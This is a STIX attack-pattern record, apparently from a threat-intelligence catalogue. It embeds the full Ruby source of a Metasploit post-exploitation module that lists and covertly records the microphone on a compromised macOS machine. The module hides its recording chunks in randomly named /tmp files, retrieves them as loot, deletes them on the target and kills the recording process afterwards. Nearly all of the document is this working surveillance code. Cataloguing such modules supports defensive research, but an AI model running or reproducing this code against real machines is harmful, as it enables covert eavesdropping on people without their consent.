{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e53116a9-e740-4610-9dea-e4ec3df7ea68",
    "created": "2024-08-14T16:33:00.694091Z",
    "modified": "2024-08-14T16:33:00.694095Z",
    "name": "OSX Manage Record Microphone",
    "description": " This module will allow the user to detect (with the LIST action) and capture (with the RECORD action) audio inputs on a remote OSX machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/manage/record_mic.rb",
            "external_id": "record_mic.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'shellwords'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n  include Msf::Post::OSX::RubyDL\n\n  POLL_TIMEOUT = 120\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Manage Record Microphone',\n        'Description' => %q{\n          This module will allow the user to detect (with the LIST action) and\n          capture (with the RECORD action) audio inputs on a remote OSX machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev'],\n        'Platform' => [ 'osx'],\n        'SessionTypes' => [ 'shell' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'Show a list of microphones' } ],\n          [ 'RECORD', { 'Description' => 'Record from a selected audio input' } ]\n        ],\n        'DefaultAction' => 'LIST'\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),\n        OptString.new('TMP_FILE',\n                      [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']),\n        OptString.new('AUDIO_COMPRESSION',\n                      [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']),\n        OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),\n        OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])\n      ]\n    )\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Invalid session ID selected.') if client.nil?\n    fail_with(Failure::BadConfig, 'Invalid action') if action.nil?\n\n    num_chunks = (datastore['RECORD_LEN'].to_f / datastore['SYNC_WAIT'].to_f).ceil\n    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10) + '1' }\n    ruby_cmd = osx_capture_media(\n      action: action.name.downcase,\n      snap_filetype: '',\n      audio_enabled: true,\n      video_enabled: false,\n      num_chunks: num_chunks,\n      chunk_len: datastore['SYNC_WAIT'],\n      video_device: 0,\n      audio_device: datastore['MIC_INDEX'],\n      snap_jpg_compression: 0,\n      video_compression: '',\n      audio_compression: datastore['AUDIO_COMPRESSION'],\n      record_file: tmp_file,\n      snap_file: tmp_file\n    )\n\n    output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)\n    if action.name =~ /list/i\n      print_good output\n    elsif action.name =~ /record/i\n      @pid = output.to_i\n      print_status \"Running record service with PID #{@pid}\"\n      (0...num_chunks).each do |i|\n        # wait SYNC_WAIT seconds\n        print_status \"Waiting for #{datastore['SYNC_WAIT'].to_i} seconds\"\n        Rex.sleep(datastore['SYNC_WAIT'])\n        # start reading for file\n        begin\n          ::Timeout.timeout(poll_timeout) do\n            loop do\n              if File.exist?(tmp_file)\n                # read file\n                contents = File.read(tmp_file)\n                # delete file\n                rm_f(tmp_file)\n                # roll filename\n                base = File.basename(tmp_file, '.*') # returns it with no extension\n                num = ((base.match(/\\d+$/) || ['0'])[0].to_i + 1).to_s\n                ext = File.extname(tmp_file) || 'o'\n                tmp_file = File.join(File.dirname(tmp_file), base + num + '.' + ext)\n                # store contents in file\n                title = 'OSX Mic Recording ' + i.to_s\n                f = store_loot(title, 'audio/quicktime', session, contents,\n                               \"osx_mic_rec#{i}.qt\", title)\n                print_good \"Record file captured and saved to #{f}\"\n                print_status 'Rolling record file. '\n                break\n              else\n                Rex.sleep(0.3)\n              end\n            end\n          end\n        rescue ::Timeout::Error\n          fail_with(Failure::TimeoutExpired, \"Client did not respond to file request after #{poll_timeout}s, exiting.\")\n        end\n      end\n    end\n  end\n\n  def cleanup\n    return unless @cleaning_up.nil?\n\n    @cleaning_up = true\n\n    if action.name =~ (/record/i) && !@pid.nil?\n      print_status('Killing record service...')\n      cmd_exec(\"/bin/kill -9 #{@pid}\")\n    end\n  end\n\n  private\n\n  def poll_timeout\n    POLL_TIMEOUT\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx']"
    ]
}